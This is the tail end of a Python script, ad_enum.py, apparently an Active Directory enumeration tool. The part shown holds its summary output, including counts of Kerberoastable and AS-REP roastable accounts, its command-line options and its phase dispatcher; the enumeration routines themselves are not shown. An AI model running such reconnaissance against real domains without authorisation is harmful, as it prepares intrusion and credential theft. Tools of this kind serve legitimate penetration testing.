    log(C.green(C.bold("  ╔══════════════════════════════════════════════════════════╗")))
    log(C.green(C.bold("  ║                  ENUMERATION SUMMARY                     ║")))
    log(C.green(C.bold("  ╚══════════════════════════════════════════════════════════╝")))
    log()
    log(f"  {C.bold('Target      :')} {s.ip}")
    log(f"  {C.bold('Session     :')} {s.session_type}")
    log(f"  {C.bold('Phase(s)    :')} {s.phase}")
    log()
    log(f"  {C.bold('Stats:')}")
    log(f"   ├─ Domain users (RPC)   : {s.user_count}")
    log(f"   ├─ Domain groups (RPC)  : {s.group_count}")
    log(f"   ├─ Shares found         : {s.share_count}")
    log(f"   ├─ SIDs enumerated      : {s.sid_count}")
    log(f"   ├─ Session privileges   : {s.priv_count}")
    log(f"   ├─ Kerberoastable accts : {s.spn_count}")
    log(f"   ├─ AS-REP roastable     : {s.asrep_count}")
    log(f"   └─ DNS records found    : {s.dns_host_count}")
    log()
    if s.findings:
        log(C.yellow(C.bold(f"  Notable Findings ({len(s.findings)}):")))
        for f in s.findings:
            log(C.yellow(f"    [!] {f}"))
    else:
        log(C.dim("  No notable findings flagged."))
    log()
    log(C.dim(f"  Full log: {s.logfile}"))
    log(C.dim(f"  Completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"))
    log()

# ─────────────────────────────────────────────────────────────
#  ARGUMENT PARSING
# ─────────────────────────────────────────────────────────────
def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="ad_enum.py",
        description="Active Directory Enumeration — Multi-Phase",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -i 10.10.10.1
  %(prog)s -i 10.10.10.1 -u administrator -p 'P@ss123' -d corp.local
  %(prog)s -i 10.10.10.1 -u user -p 'pass' -d corp.local --phase ldap
        """,
    )
    parser.add_argument("-i", "--ip",     required=True, help="Target DC IP address")
    parser.add_argument("-u", "--user",   default="",    help="Username (default: null session)")
    parser.add_argument("-p", "--pass",   default="",    dest="password", help="Password")
    parser.add_argument("-d", "--domain", default="",    help="Domain FQDN (e.g. corp.local)")
    parser.add_argument(
        "--phase",
        choices=["smb", "ldap", "kerberos", "dns", "all"],
        default="all",
        help="Phase to run (default: all)",
    )
    return parser.parse_args()

# ─────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────
def main():
    global _logfile

    args = parse_args()

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    logfile   = f"ad_enum_{timestamp}.log"
    _logfile  = logfile

    s = EnumState(
        ip       = args.ip,
        username = args.user,
        password = args.password,
        domain   = args.domain,
        phase    = args.phase,
        logfile  = logfile,
    )

    print_header(s)

    phase_map = {
        "smb":      phase_smb,
        "ldap":     phase_ldap,
        "kerberos": phase_kerberos,
        "dns":      phase_dns,
    }

    if s.phase == "all":
        for fn in phase_map.values():
            fn(s)
    else:
        phase_map[s.phase](s)

    print_summary(s)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.yellow('[!] Interrupted by user.')}")
        sys.exit(0)
